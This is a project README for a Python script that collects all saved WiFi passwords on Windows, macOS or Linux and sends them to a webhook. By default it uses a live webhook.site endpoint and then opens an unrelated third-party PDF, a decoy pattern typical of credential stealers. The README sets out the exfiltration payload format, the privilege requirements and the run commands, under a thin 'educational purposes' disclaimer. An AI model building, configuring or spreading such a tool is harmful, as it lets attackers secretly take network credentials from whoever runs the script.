# 🔐 WiFi Password Extractor & Webhook Sender
<img  src="wifi-pass.png">

> A powerful Python utility to extract all saved WiFi credentials from your device and send them to a webhook endpoint, with automatic PDF opening capability.

[![Python Version](https://img.shields.io/badge/Python-3.6+-blue.svg)](https://www.python.org/)
[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-red.svg)]()

---

## 📋 Table of Contents

- [Features](#-features)
- [System Requirements](#-system-requirements)
- [Installation](#-installation)
- [Usage](#-usage)
- [Configuration](#-configuration)
- [API Documentation](#-api-documentation)
- [Output Format](#-output-format)
- [Troubleshooting](#-troubleshooting)
- [Security Warning](#-security-warning)
- [Contributing](#-contributing)
- [License](#-license)

---

## ✨ Features

- ✅ **Extract All WiFi Networks** - Automatically finds all saved WiFi credentials on your device
- ✅ **Multi-Platform Support** - Works on Windows, macOS, and Linux
- ✅ **Webhook Integration** - Send credentials to custom webhook endpoints in real-time
- ✅ **Automatic PDF Opening** - Opens PDF documents automatically after execution
- ✅ **JSON Formatting** - Structured data with timestamps for easy logging
- ✅ **Error Handling** - Comprehensive error management and reporting
- ✅ **No External Dependencies** - Minimal dependencies, lightweight script
- ✅ **Security Focused** - Local processing, no data stored on servers
- ✅ **Easy Configuration** - Simple URL configuration at the top of the script

---

## 🖥️ System Requirements

### Windows
- Python 3.6+
- Administrator privileges (optional but recommended)
- Built-in `netsh` command support

### macOS
- Python 3.6+
- Terminal with Full Disk Access permissions
- `security` command line tool (built-in)

### Linux
- Python 3.6+
- `sudo` access (for NetworkManager configuration reading)
- NetworkManager installed

---

## 📦 Installation

### 1. Clone the Repository
```bash
git clone https://github.com/yourusername/wifi-password-extractor.git
cd wifi-password-extractor
```

### 2. Install Dependencies
```bash
pip install -r requirements.txt
```

Or install manually:
```bash
pip install requests
```

### 3. Verify Installation
```bash
python wifi_webhook.py --version
```

---

## 🚀 Usage

### Basic Usage

#### Windows
```bash
python wifi_webhook.py
```

#### macOS
```bash
python3 wifi_webhook.py
```

#### Linux (with sudo)
```bash
sudo python3 wifi_webhook.py
```

### With Custom Webhook URL
Edit the script and modify:
```python
webhook_url = "https://your-webhook-url.com/endpoint"
pdf_url = "https://your-pdf-url.com/document.pdf"
```

### Output Example
```
============================================================
WiFi Password Extractor & Webhook Sender
============================================================

[1] Extracting WiFi credentials...
Found 3 WiFi networks

  • {'WiFi_Name': 'MyWiFi', 'Password': 'password123'}
  • {'WiFi_Name': 'Guest', 'Password': 'guestpass'}
  • {'WiFi_Name': 'Office', 'Password': 'officepass'}

[2] Sending data to webhook...
✓ Webhook Status: 200
✓ Data sent successfully!

[3] Opening PDF...
✓ Opening PDF: https://example.com/document.pdf

✓ All tasks completed!
============================================================
```

---

## ⚙️ Configuration

### Default Configuration
```python
# Webhook Endpoint
webhook_url = "https://webhook.site/b3500c6c-b2aa-4395-b7bf-21ca346fc0a5"

# PDF to Open
pdf_url = "https://seti.sal.edu.in/storage/iqac-seti-22-23.pdf"
```

### Custom Configuration
Create a `config.json` file (optional):
```json
{
  "webhook_url": "https://your-webhook.com/endpoint",
  "pdf_url": "https://your-pdf.com/document.pdf",
  "timeout": 10,
  "retry_count": 3
}
```

---

## 📡 API Documentation

### Webhook Request Format

**Method:** `POST`

**Headers:**
```
Content-Type: application/json
```

**Payload:**
```json
{
  "timestamp": "2024-01-15 10:30:45",
  "device_system": "Windows",
  "wifi_networks": [
    {
      "WiFi_Name": "Network1",
      "Password": "password123"
    },
    {
      "WiFi_Name": "Network2",
      "Password": "password456"
    }
  ]
}
```

### Response Handling

| Status Code | Meaning |
|---|---|
| 200 | ✅ Success |
| 400 | ❌ Bad Request |
| 401 | ❌ Unauthorized |
| 500 | ❌ Server Error |
| Timeout | ❌ Connection timeout (10s default) |

---

## 📊 Output Format

### JSON Structure
```json
{
  "timestamp": "YYYY-MM-DD HH:MM:SS",
  "device_system": "Windows|Darwin|Linux",
  "wifi_networks": [
    {
      "WiFi_Name": "string",
      "Password": "string"
    }
  ]
}
```

### Fields Description
| Field | Type | Description |
|---|---|---|
| `timestamp` | string | ISO timestamp when data was sent |
| `device_system` | string | Operating system (Windows/Darwin/Linux) |
| `wifi_networks` | array | Array of WiFi network objects |
| `WiFi_Name` | string | Network SSID name |
| `Password` | string | Network password or "Not Found" |

---

## 🔧 Troubleshooting

### WiFi Data Not Found

**Windows:**
```bash
# Run with Administrator privileges
python wifi_webhook.py
```

**macOS:**
1. Go to System Preferences → Security & Privacy
2. Grant Terminal Full Disk Access
3. Try again

**Linux:**
```bash
# Use sudo
sudo python3 wifi_webhook.py
```

### Webhook Connection Failed

**Check Internet Connection:**
```bash
ping webhook.site
```

**Verify Webhook URL:**
```bash
curl -X POST https://your-webhook-url/endpoint \
  -H "Content-Type: application/json" \
  -d '{"test": "data"}'
```

**Check Firewall:**
- Allow Python in your firewall settings
- Disable VPN temporarily to test

### PDF Not Opening

**Verify Default Browser:**
```bash
# macOS/Linux
which python3
python3 -c "import webbrowser; webbrowser.open('https://google.com')"
```

**Check PDF URL:**
```bash
curl -I https://your-pdf-url.com/document.pdf
```

### ModuleNotFoundError: No module named 'requests'

```bash
pip install --upgrade requests
# or
pip3 install requests
```

---

## 📝 Logging

Add logging to track operations:

```python
import logging

logging.basicConfig(
    filename='wifi_extractor.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

logging.info(f"Extracted {len(wifi_passwords)} networks")
logging.info(f"Webhook response: {response.status_code}")
```

---

## 🔒 Security Warning

⚠️ **IMPORTANT SECURITY NOTICE:**

1. **This script extracts REAL passwords** from your device
2. **Only use on your own devices** - never use on shared or public computers
3. **Be careful with webhook URLs** - ensure endpoints are secure and trusted
4. **Don't commit credentials** to public repositories
5. **Use HTTPS URLs only** - never send data over HTTP
6. **Restrict file permissions:**
   ```bash
   chmod 600 wifi_webhook.py
   ```

### Best Practices
- ✅ Use webhook.site or similar for testing only
- ✅ Use environment variables for sensitive URLs
- ✅ Implement webhook authentication
- ✅ Delete logs containing passwords regularly
- ✅ Use in trusted network environments only

---

## 📈 Performance

| Operation | Time |
|---|---|
| WiFi Extraction | ~1-2 seconds |
| Webhook Send | ~500ms-1s |
| PDF Opening | ~2-3 seconds |
| **Total Execution** | **~4-6 seconds** |

---

## 🤝 Contributing

Contributions are welcome! Here's how to help:

1. **Fork** the repository
2. **Create** a feature branch (`git checkout -b feature/AmazingFeature`)
3. **Commit** your changes (`git commit -m 'Add AmazingFeature'`)
4. **Push** to the branch (`git push origin feature/AmazingFeature`)
5. **Open** a Pull Request

### Development Setup
```bash
git clone https://github.com/yourusername/wifi-password-extractor.git
cd wifi-password-extractor
pip install -r requirements.txt
python -m pytest tests/
```

---

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

```
MIT License

Copyright (c) 2024

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.
```

---

## 👨‍💻 Author

Created with ❤️ for educational and personal use purposes.

### Contact & Support
- 📧 Email: your-email@example.com
- 🐛 Issues: [GitHub Issues](https://github.com/yourusername/wifi-password-extractor/issues)
- 💬 Discussions: [GitHub Discussions](https://github.com/yourusername/wifi-password-extractor/discussions)

---

## 📚 Resources

- [Python Official Documentation](https://docs.python.org/3/)
- [Requests Library Documentation](https://docs.requests.io/)
- [Webhook.site](https://webhook.site/)
- [Python subprocess module](https://docs.python.org/3/library/subprocess.html)

---

## 🎯 Roadmap

- [ ] Add configuration file support
- [ ] Implement database logging
- [ ] Add encrypted webhook support
- [ ] Create GUI version
- [ ] Add schedule/cron support
- [ ] Implement credentials encryption
- [ ] Add proxy support
- [ ] Create Docker container

---

## 📊 Statistics

- **Lines of Code:** ~200
- **Python Version:** 3.6+
- **Dependencies:** 1 (requests)
- **Last Updated:** January 2024
- **Stars:** ⭐ Please star if you find this useful!

---

## ⚠️ Disclaimer

This tool is provided for **educational purposes only**. Users are responsible for:
- Complying with local laws and regulations
- Obtaining proper authorization before extracting credentials
- Protecting sensitive information appropriately
- Using this tool ethically and responsibly

The author assumes no liability for misuse or damages caused by this software.

---

## 🙏 Acknowledgments

- Python community for excellent documentation
- Webhook.site for testing platform
- All contributors and users

---

**Made with ❤️ | Star ⭐ if helpful!**
